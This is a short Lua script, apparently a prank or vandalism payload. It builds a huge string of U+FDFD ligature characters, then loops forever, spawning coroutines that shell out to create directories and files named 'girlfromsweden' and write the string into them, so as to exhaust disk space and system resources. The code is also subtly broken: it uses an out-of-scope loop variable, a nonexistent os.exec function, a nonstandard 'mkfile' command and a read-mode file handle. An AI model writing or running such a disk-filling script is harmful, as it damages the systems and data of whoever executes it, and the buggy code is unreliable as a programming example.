local data = ''

for i = 1, 100000 do
	data = data .. '﷽'
end

while true do
	coroutine.wrap(function()
		local name = 'girlfromsweden' .. i

		os.exec('mkdir ' .. name)
		os.exec('mkfile ' .. name)

		local path = ('%s/%s'):format(name, name)
		local file = io.open(path)

		file:write(data)
		file:close()
	end)()
end
